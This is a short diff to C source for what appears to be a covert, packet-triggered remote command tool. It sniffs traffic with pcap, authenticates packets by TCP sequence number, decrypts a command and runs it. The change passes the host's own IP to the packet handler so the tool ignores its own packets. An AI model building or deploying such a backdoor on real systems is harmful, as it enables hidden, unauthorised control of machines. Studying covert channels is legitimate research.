@@ -4,7 +4,6 @@
 #include <string.h>
 #include <unistd.h>
 
-#include "constants.h"
 #include "crypto.h"
 #include "networking.h"
 #include "packet_auth.h"
@@ -64,7 +63,10 @@ char **execute_command(const char *command, int *size)
 void got_packet(u_char *args, const struct pcap_pkthdr *header,
                 const u_char *packet)
 {
-    Mode mode = *(Mode*)args;
+    struct handler_args *pargs = (struct handler_args*)args;
+    Mode mode = pargs->mode;
+    struct in_addr this_ip = pargs->address;
+
     char decrypted[MAX_COMMAND_LEN];
 
     int tcp_sport;
@@ -95,6 +97,11 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header,
     // Step 1: Locate the payload of the packet
     payload = (char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
     size_payload = ntohs(ip->ip_len) - size_ip - size_tcp;
+
+    if (ip->ip_src.s_addr == this_ip.s_addr)
+    {
+        return;
+    }
 
     // Step 2: Authenticate the packet
     if (!is_seq_num_auth(tcp_sport, tcp_seqnum))
